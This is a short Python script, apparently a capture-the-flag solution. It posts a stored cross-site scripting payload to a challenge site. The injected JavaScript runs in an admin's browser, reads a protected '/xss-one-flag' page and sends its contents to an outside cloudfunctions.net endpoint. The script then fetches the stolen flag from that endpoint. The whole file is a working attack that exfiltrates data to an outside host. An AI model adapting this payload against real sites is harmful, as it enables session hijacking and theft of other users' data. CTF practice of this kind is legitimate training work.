import sys
import requests 

payload_part1 = "<script>" \
+ "var xhr = new XMLHttpRequest();" \
+ "xhr.open('GET','/xss-one-flag',true);" \
+ "xhr.onload = function () {" \
+ "var request = new XMLHttpRequest();" \
+ "request.open('GET','"

payload_part2 = "/store-flag?flag=' + xhr.responseText,true);" \
+ "request.send()};" \
+ "xhr.send(null);" \
+ "</script>"

url = "https://us-west1-corgi-test.cloudfunctions.net"

if len(sys.argv) != 2:
    print("Please specify challenge URL and request bin URL")
    print("python solution.py <challenge-url>")
else:  
	vector = payload_part1 + url + payload_part2
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-one-result', data=param)
	print("Response as non-Admin")
	print(response.text)
	print("Response as Admin")
	response = requests.get('https://us-west1-corgi-test.cloudfunctions.net/print-flag')
	print(response.text)
